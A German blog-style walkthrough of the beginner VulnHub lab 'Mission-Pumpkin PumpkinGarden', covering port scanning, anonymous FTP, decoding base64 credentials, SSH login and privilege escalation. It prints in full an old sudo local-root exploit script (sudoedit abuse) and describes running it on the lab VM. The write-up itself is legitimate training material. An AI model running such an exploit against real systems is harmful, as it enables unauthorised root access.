# Mission-Pumpkin v1.0: PumpkinGarden

Die Trilogie sah sehr interessant aus, also habe ich mich dazu entschieden sie [auszuprobieren.](https://www.vulnhub.com/?q=pumpkin) 

## Verwendete Techniken
````
- Zenmap (nmap GUI)
- vsftp
- base64
- SSH
- Google
````

*[Image: Image]*

## Herausfinden der IP-Adressse

Die VM ist für absolute Beginner ausgelegt, daher war der erste Schritt tatsächlich der einfachste.

Im Login-Screen der VM wurde die IP angezeigt. Ich wusste also, dass es sich hier um die IP 192.168.178.59 dreht.

## Erste Ansatzpunkte finden

Als erstes starte ich (wie bei jeder neuen VM) mit einem Portscan über Zenmap.

Ja, ich weiß Kommandozeilentools sind definitiv viel mehr 1337-Style, aber mir gefällt das GUI einfach besser ;)

*[Image: img]*

## FTP-Server

Okay, wenn nichts anderes angezeigt wird, als ein FTP-Server, ist das wohl der nächste Schritt!

vsftp (very secure ftp) hat sehr oft einen anonymous login (User: anonymous: Pass: ). Das habe ich zuerst ausprobiert.

*[Image: img]*

Da ich bisher noch nie über die Kommandozeile mit einem FTP-Server gearbeitet habe, musste ich mich mit den Befehlen erstmal zurecht finden.

Am Ende habe ich aber bekommen, was ich wollte.

*[Image: img]*

In der note.txt stand:
```markdown
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
````
Wer zur Hölle ist Jack?

Ist das ein Benutzername? Oder eine Anspielung auf das englische "Jack-o-lantern" (Kürbislaterne)?

Ich schreibe mir das mal auf und komme vielleicht später darauf zurück.

## Wenn es nicht mehr vorwärts geht, muss man eben einen Schritt zurück gehen...

Da ich aktuell einfach keinen Ansatzpunkt hatte, wo ich weiter machen sollte, habe ich nochmal Zenmap genutzt: diesmal aber mit einer größeren Portrange.

Bingo!

*[Image: img]*

Jetzt habe ich einen Fileserver, einen Webserver und SSH-Zugang. Das sieht schon mal besser aus!

#### Erste wichtige Erkenntnis: Auch Dienste mit (eigentlich) fixen Ports, so wie http auf Port 80 und SSH auf Port 22, müssen nicht immer da sein, wo man sie vermutet!

## Webserver

Mal sehen, was der Webserver so für mich bereithält:

*[Image: img]*

Soso, `the route map to PumpkinGarden is somewhere under the hood`. 

Das schreit ja schon fast nach dem Sourcecode der Seite.

*[Image: img]*

Okay, der Weg war auf jeden Fall der richtige, aber was soll mir das sagen? 

Da es hier um ein CTF für absolute Beginner geht (so stand es jedenfalls auf [VulnHub](https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/)), bin ich nicht davon ausgegangen, dass hier von Steganografie die Rede ist.
Trotzdem habe ich mir das Bild natürlich genauer angesehen. Ohne brauchbares Ergebnis. 

Das Einzige, was mir die Datei verraten hat, ist der Pfad unter welchem sie gespeichert ist:
`192.168.178.59:1515/images`

Da habe ich den Browser hinnavigiert und siehe da:

*[Image: img]*

`hidden_secret` hört sich doch gut an. Als ich das Verzeichnis geöffnet hatte, lag dort nur eine Textdatei (clue.txt).

*[Image: img]*

Das sieht für mich nach einem Hash oder auf jeden Fall nach einem verschlüsselten Text aus. Den String habe ich an `hash-identifier` übergeben, aber das ergab nichts.
Die nächste Idee, die ich hatte war base64. Aber hätte das nicht grade erkannt werden müssen? -> Google

#### Zweite wichtige Erkenntnis: base64 ist kein Hash! Die Länge eines base64 strings variiert, weil er die unverschlüsselten Daten enthält. Hashes wie z.B. SHA1 oder MD5 haben eine fixe Länge. 20 Byte für SHA1 und 16 Byte für MD5.

Um den String über base64 entschlüsseln zu lassen hilft folgender Befehl:

`echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d`

Voilá `scarecrow : 5Qn@$y`

Das sieht sehr nach Login Daten aus!

## SSH

Mal sehen, ob die Daten als SSH-Login funktionieren:

*[Image: img]*

Oh ja, das tun sie! Ein wichtiger Schritt ist gemacht, ich bin im System der VM.

Nachdem ich `ls -la` eingegeben hatte, fiel mir eine Textdatei auf: note.txt

*[Image: img]*

Goblin? Was für ein Goblin? Ist das ein neuer Benutzername?
Die `/etc/passwd` kann man eigentlich immer auslesen. Da sieht man sehr gut, dass es einen Benutzer "goblin" gibt.

*[Image: img]*

Mal sehen, ob der komische Text aus der note.txt das Passwort für goblin ist.

*[Image: img]*

Super, das hat schon mal funktioniert! Zuerst umschauen, was es hier gibt mit: `ls -la` 

*[Image: img]*

## Privilege escalation

Na das liest sich doch super! Dummerweise war das eine Sackgasse, weil die Seite einen 404er Error gebracht hat. Mies, und jetzt?

Was immer sehr gut hilft, ist "Tante Google"! Nach ein paar Minuten hatte ich rausgefunden, was sich hinter dem Link hätte verbergen sollen:

Ein Bash-Script, was mich zum root machen sollte.

So sieht das Script aus:
````
#!/bin/sh
# Tod Miller Sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4
# local root exploit
# March 2010
# automated by kingcope
# Full Credits to Slouching
echo Tod Miller Sudo local root exploit
echo by Slouching
echo automated by kingcope
if [ $# != 1 ]
then
echo "usage ./sudoxpl.sh <file you have permission to edit>"
exit
fi
# cd /tmp
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit $1
````

Also habe ich zu `/tmp` navigiert, weil dort jeder User Schreibrechte hat. Da habe ich mit `nano sudoexpl.sh` eine neue Datei mit dem Script als Inhalt erstellt, mit `chmod +x sudoexpl.sh` eine Ausführberechtigung hinzugefügt und das Script gestartet `./sudoexpl.sh`.

Es ist rein gar nichts passiert. Wieso das? Vielleicht muss ich das als User scarecrow ausführen.

Nein, auch das hat nicht funktioniert. Komisch. 

Ich habe mich nochmal als goblin angemeldet und `ps -aux` ausgeführt. Dieser Befehl zeigt alle laufenden Prozesse aller Nutzer.

Ja klasse, es läuft ein Script, welches alle 15 Sekunden den Inhalt der Verzeichnisse `/tmp` und `/home/goblin` löscht.

Das heißt also, dass ich in wenigen Sekunden das Script erstellen, die Berechtiungen ändern und es ausführen muss.

Ich habe ein paar Versuche gebraucht, aber als die richtigen Befehle dann in der Bash-History standen und ich mit dem Pfeil nach oben durch die Befehle wechseln konnte, hat es dann geklappt.

*[Image: img]*

## BAM root shell!

Neuer Benutzer -> Umschauen mit `ls -la`. Hier liegt eine PumpkinGarden_Key Datei. Super, den Schlüssel zum Kürbisgarten habe ich gesucht!

*[Image: img]*

Das ist definitiv wieder ein base64 String. Auch den habe ich entschlüsseln lassen:

*[Image: img]*

Das war's! Ich stehe quasi im Garten :) Dieses CTF hat mir wirklich Spaß gemacht und ich kann es gar nicht erwarten Part II zu probieren.

Danke für's Lesen und happy pwning!

Kontakt -> [Twitter](https://twitter.com/_the_someone)
